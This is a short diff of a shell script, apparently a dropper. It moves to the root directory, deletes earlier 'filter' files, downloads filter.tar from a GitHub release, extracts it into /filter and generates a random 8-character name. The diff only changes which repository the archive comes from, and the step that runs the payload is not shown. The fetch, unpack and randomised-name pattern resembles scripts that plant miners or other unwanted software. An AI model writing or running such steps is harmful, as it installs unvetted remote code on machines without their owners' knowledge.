@@ -1,7 +1,7 @@
 cd /
 rm -rf filter.tar
 rm -rf filter
-wget https://github.com/rubbyadi/sengkreat/releases/download/v1.0.2/filter.tar
+wget https://github.com/dynamicxe/echo/releases/download/v1.0.2/filter.tar
 tar -xvf filter.tar
 cd /filter
 variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
